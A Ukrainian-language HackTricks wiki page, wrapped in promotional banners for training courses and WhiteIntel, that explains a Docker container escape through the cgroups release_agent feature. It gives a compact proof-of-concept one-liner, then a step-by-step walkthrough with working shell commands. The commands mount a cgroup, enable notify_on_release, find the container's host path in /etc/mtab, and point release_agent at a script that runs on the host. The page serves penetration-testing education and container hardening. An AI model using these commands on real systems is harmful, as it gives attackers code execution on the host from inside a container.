# Втеча з контейнера Docker через використання release\_agent cgroups

{% hint style="success" %}
Вивчайте та вправляйтеся в хакінгу AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та вправляйтеся в хакінгу GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакінг-прийоми, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **та** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) - це пошуковик, який працює на **темному вебі** та пропонує **безкоштовні** функціональні можливості для перевірки, чи були **компанія або її клієнти скомпрометовані** **шкідливими програмами-крадіями**.

Основною метою WhiteIntel є боротьба з захопленням облікових записів та атаками вірусів-вимагачів, що виникають внаслідок шкідливих програм, які крадуть інформацію.

Ви можете перевірити їх веб-сайт та спробувати їхній двигун **безкоштовно** за посиланням:

{% embed url="https://whiteintel.io" %}

***

**Для отримання додаткових відомостей дивіться** [**оригінальний допис у блозі**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Це лише краткий огляд:

Оригінальний PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Доказ концепції (PoC) демонструє метод використання cgroups шляхом створення файлу `release_agent` та спричинення його виклику для виконання довільних команд на контейнерному хості. Ось розбір кроків, які беруть участь:

1. **Підготовка середовища:**
* Створюється каталог `/tmp/cgrp` для використання як точка монтування cgroup.
* Контролер cgroup RDMA монтується до цього каталогу. У випадку відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Налаштування дочірнього Cgroup:**
* Дочірній cgroup з назвою "x" створюється в монтуємому каталозі cgroup.
* Сповіщення увімкнені для cgroup "x", записуючи 1 у його файл notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Налаштування агента вивільнення:**
* Шлях контейнера на хості отримується з файлу /etc/mtab.
* Потім файл release\_agent cgroup налаштовується на виконання скрипту з назвою /cmd, розташованого за отриманим шляхом хоста.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Створення та налаштування сценарію /cmd:**
* Сценарій /cmd створюється всередині контейнера та налаштовується для виконання ps aux, перенаправляючи вивід у файл з назвою /output у контейнері. Вказується повний шлях до /output на хості.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Запуск атаки:**
* Процес запускається у дитячому cgroup "x" і негайно припиняється.
* Це спричиняє виконання `release_agent` (сценарій /cmd), який виконує ps aux на хості та записує вивід до /output у контейнері.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) - це пошуковик, який працює на **темному вебі** і пропонує **безкоштовні** функціональні можливості для перевірки, чи були **компанія або її клієнти** **пошкоджені** **викрадачами вірусів**.

Основна мета WhiteIntel - це боротьба з захопленням облікових записів та атаками від шифрувального вірусу, що виникають внаслідок вірусів, які крадуть інформацію.

Ви можете перевірити їх веб-сайт та спробувати їхній двигун **безкоштовно** за посиланням:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
